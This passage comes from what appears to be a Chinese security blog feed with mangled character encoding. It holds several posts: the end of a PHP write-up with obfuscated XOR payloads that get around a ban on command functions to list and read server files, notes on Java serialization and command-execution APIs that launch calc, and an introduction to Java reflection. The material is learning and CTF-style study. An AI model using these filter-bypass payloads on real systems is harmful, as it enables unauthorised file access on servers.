<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«banäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰PHPçš„åŸç”Ÿå‡½æ•°:scan_dirå’Œglobï¼Œè¯»å–æ–‡ä»¶çš„è¯å¯ä»¥ç”¨highlight_file()å’Œreadfile</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹ï¼š</span><br><span class="line">print_r(scandir(.));</span><br><span class="line">show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>



<p>åˆ†åˆ«å¾—å‡ºpayloadï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaSerialize</title>
    <url>/2020/11/02/JavaSerialize/</url>
    <content><![CDATA[<p>JAVAå½“ä¸­å¯¹äºæ–‡ä»¶çš„å¤„ç†éƒ½æ˜¯é€šè¿‡IOæµè¿›è¡Œæ“ä½œçš„</p>
<h1 id="ä¸€äº›IOæµçš„API"><a href="#ä¸€äº›IOæµçš„API" class="headerlink" title="ä¸€äº›IOæµçš„API"></a>ä¸€äº›IOæµçš„API</h1><ul>
<li>FileOutputStream  å†™å…¥æµï¼Œæˆ‘ä»¬ç”¨è¯¥æµå¯ä»¥å†™å…¥å†…å®¹åˆ°æ–‡ä»¶å½“ä¸­</li>
<li>FileInputStream   è¯»å–æµ</li>
<li>ObjectOutputStream è¯¥æµå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡å†™å‡ºï¼Œæˆ–è€…è¯»å–ä¸€ä¸ªå¯¹è±¡åˆ°ç¨‹åºä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚</li>
<li>ObjectInputStream  ååºåˆ—åŒ–å¹¶æ‰“å°æ•°æ®</li>
</ul>
<h1 id="JAVAååºåˆ—åŒ–è¿‡ç¨‹"><a href="#JAVAååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="JAVAååºåˆ—åŒ–è¿‡ç¨‹"></a>JAVAååºåˆ—åŒ–è¿‡ç¨‹</h1><p>é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ï¼ŒJavaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶aa.serä¸­</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// aa.serä¸­è¯»å–æ•°æ®</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡obj,æ³¨æ„è¿™é‡Œä½¿ç”¨å¼ºè½¬</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™ä¸²ä»£ç ï¼Œæˆ‘ä»¬å°†æ•°æ®lsä¼ å…¥åˆ°äº†aa.serå½“ä¸­ï¼Œå¹¶ä¸”å°†å…¶é‡æ–°é‡Šæ”¾äº†å‡ºæ¥ã€‚æˆ‘ä»¬æˆåŠŸé€šè¿‡å†™å…¥åºåˆ—åŒ–æ–‡ä»¶å¹¶å°†å…¶æˆåŠŸè¿”å›ã€‚</p>
<p>å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚æ•…æˆ‘ä»¬å†™ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setAge(<span class="number">19</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;sakani&quot;</span>);</span><br><span class="line">      <span class="comment">//  person.setSex(true);</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å› ä¸ºæ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œæ­¤æ—¶éœ€è¦å¤„ç†å¼‚å¸¸</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person <span class="title">UnSerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        è¯»å–æ–‡ä»¶</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line"><span class="comment">//        åˆ°è¿™ä¸€æ­¥æ¥è¯»å–äº†æ–‡ä»¶æµï¼Œä¸‹ä¸€æ­¥å°†å…¶å¼ºè½¬å›å¯¹è±¡</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"><span class="comment">//        readObject æ˜¯ç”¨æ¥è¯»å–è¯¥æµå½“ä¸­çš„å¯¹è±¡</span></span><br><span class="line">        Person person2 =  (Person)objectInputStream.readObject();</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line">        <span class="keyword">return</span> person2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        SerializePerson();</span><br><span class="line"><span class="comment">//        è¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–å‡½æ•°</span></span><br><span class="line">        Person person2 = UnSerializePerson();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,person2.getName(),person2.getAge()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¿…é¡»è¦å®ç°åºåˆ—åŒ–æ¥å£æ‰å¯ä»¥è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">boolean</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><h2 id="1-java-lang-Runtime"><a href="#1-java-lang-Runtime" class="headerlink" title="1.java.lang.Runtime"></a>1.java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        Process start = runtime.exec(<span class="string">&quot;ping sakani.top&quot;</span>);</span><br><span class="line">        InputStream inputStream = start.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(res,<span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œç¬¬ä¸€ç§æ–¹å¼å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„æ¥ä¼ å…¥å‘½ä»¤ï¼Œç¬¬äºŒç§åˆ™æ˜¯å‘Šè¯‰å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç¬¬å››ç§åˆ™æ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œåå¼¹shell,ä½†æ˜¯ç”¨è¯¥æ–¹æ³•çš„æ—¶å€™æˆ‘åªå¾—åˆ°äº†ä¸€æ¡pingçš„æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯èƒ½å¹¶ä¸æ˜¯å¾ˆé è°±</p>
<p><img src="image-20201103201813595.png" alt="image-20201103201813595"></p>
<h2 id="2-java-lang-ProcessBuilder"><a href="#2-java-lang-ProcessBuilder" class="headerlink" title="2.java.lang.ProcessBuilder"></a>2.java.lang.ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    Process start = processBuilder.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe &quot;</span>,<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">    processBuilder.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œå‡½æ•°ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨çš„æ—¶å€™éœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œä»€ä¹ˆæ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ‰æ˜¯å‘½ä»¤</p>
<h2 id="3-java-lang-Processlmpl"><a href="#3-java-lang-Processlmpl" class="headerlink" title="3.java.lang.Processlmpl"></a>3.java.lang.Processlmpl</h2><p>è¿™ç§æ–¹æ³•æ˜¯ProcessBuilderçš„çˆ¶ç±»ï¼Œä½†æ˜¯å› ä¸ºå…¶ä¸ºç§æœ‰ç±»ï¼Œæˆ‘ä»¬éœ€è¦è·å–çš„æ—¶å€™åªèƒ½é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">    Method start = aClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">    start.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    start.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®©æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ä½¿ç”¨cmdï¼Œç›´æ¥ä½¿ç”¨çš„nullï¼Œå´å¯ä»¥æˆåŠŸå¾—åˆ°è¿è¡Œå‘¢ï¼Ÿ</p>
<p>ç¨å¾®å®¡è®¡äº†ä»¥ä¸‹æºç ï¼Œçœ‹åˆ°äº†å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Process <span class="title">start</span><span class="params">(String cmdarray[],   //æ³¨æ„è¿™é‡Œï¼Œä¼ å…¥çš„å°±æ˜¯cmdarray</span></span></span><br><span class="line"><span class="function"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span></span><br><span class="line"><span class="function"><span class="params">                     String dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>é¡ºä¾¿è¡¥å……ä¸€ä¸‹åå°„çš„å‡ ä¸ªçŸ¥è¯†ï¼š</p>
<ul>
<li>class.forNameç”¨äºåå°„ç±»ï¼ŒæŒ‡å®šç±»åå³å¯</li>
<li>class.getDeclaredMethod ç”¨äºæ˜ å°„ç±»ä¸­çš„æ–¹æ³•</li>
<li>invoke ï¼Œå¼€å§‹è°ƒç”¨è¯¥æ–¹æ³•ï¼Œ ä¼ å…¥å‚æ•°å³å¯ä½¿ç”¨</li>
</ul>
<h2 id="4-javax-script-ScriptEngineMana"><a href="#4-javax-script-ScriptEngineMana" class="headerlink" title="4. javax.script.ScriptEngineMana"></a>4. javax.script.ScriptEngineMana</h2><p>æœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨ä¸Šé¢çš„ä¸‰ç§æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    Object scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    System.out.println(scriptEngineManager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘æ¯”è¾ƒæƒŠè®¶ï¼Œä¸ºä»€ä¹ˆè¾“å‡ºè¯­å¥ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿ</p>
]]></content>
  </entry>
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†</title>
    <url>/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>JavaåŠ¨æ€ä»£ç†å†å½“å‰çš„Javaä»£ç ä¸­å‡ ä¹éšå¤„å¯è§ï¼Œå› ä¸ºå®ƒæ—¢å¯ä»¥è·å–Javaé™æ€ä»£ç†çš„å¯æ‹“å±•æ€§ï¼Œå¹¶ä¸”å®ƒä¹Ÿå¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç å˜å¾—å¹¶ä¸ç¹çï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ­£æ˜¯ç”±äºJavaçš„åŠ¨æ€ä»£ç†åŸç†æ˜¯åå°„ï¼Œ<strong>æ•…è¿˜ä¼šå¼•å‡ºå¾ˆå¤šå®‰å…¨é—®é¢˜</strong>ï¼Œæˆ‘ä»¬è¦çŸ¥é“ï¼ŒJavaçš„åå°„æœ¬èº«å°±æ˜¯ä¸å®‰å…¨çš„ä¸€ä»¶äº‹ï¼ˆPrivateé¦–å…ˆå°±å˜å¾—æ¯«æ— æ„ä¹‰äº†ï¼‰</p>
<p>è¯è¯´å›æ¥ï¼Œæƒ³è¦å­¦ä¹ å¥½åŠ¨æ€ä»£ç†ï¼Œåå°„çš„å­¦ä¹ æ˜¯å¿…ä¸å¯å…çš„ï¼Œå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡æˆ‘å»ºè®®å…ˆå­¦ä¹ åå°„ï¼Œè¿™é‡Œå°†ä¸€äº›APIå†™ç½—åˆ—å‡ºæ¥ï¼Œæ–¹ä¾¿æ²¡æœ‰å­¦è¿‡åå°„ï¼Œæˆ–è€…å¯¹åå°„å¹¶ä¸ç†Ÿæ‚‰çš„è¯»è€…å¯ä»¥é˜…è¯»åé¢çš„æ–‡ç« </p>
<h1 id="åå°„API"><a href="#åå°„API" class="headerlink" title="åå°„API"></a>åå°„API</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>[ä¸€ä¸ªå®ä¾‹å¯¹è±¡].getClass ,å°†è¿”å›å®ä¾‹çš„ç±»ï¼Œæˆ‘è¿™é‡Œç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæ¼”ç¤ºï¼š</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“å‰ä»£ç çš„è¾“å‡ºç»“æœä¸ºï¼š</p>
<p><img src="image-20201110200039318.png" alt="image-20201110200039318"></p>
<p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼Œè·å–äº†è¯¥å¯¹è±¡</p>
<h2 id="getclass-getInterfaces"><a href="#getclass-getInterfaces" class="headerlink" title="getclass().getInterfaces()"></a>getclass().getInterfaces()</h2><p>å…¶å®æˆ‘ä»¬è¯»åå­—ä¹Ÿå¯ä»¥å¾ˆæ¸…æ¥šçš„æ˜ç™½å®ƒçš„ç”¨é€”äº†ï¼Œç”¨äºè·å–å½“å‰çš„ç»§æ‰¿çš„æ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getInterfaces());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span> <span class="keyword">implements</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;jiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›ç»“æœä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[Ljava.lang.Class;@<span class="number">7f</span>31245a</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¾¿å¾—åˆ°äº†ç±»çš„æ¥å£äº†ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯ä»¥æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“</p>
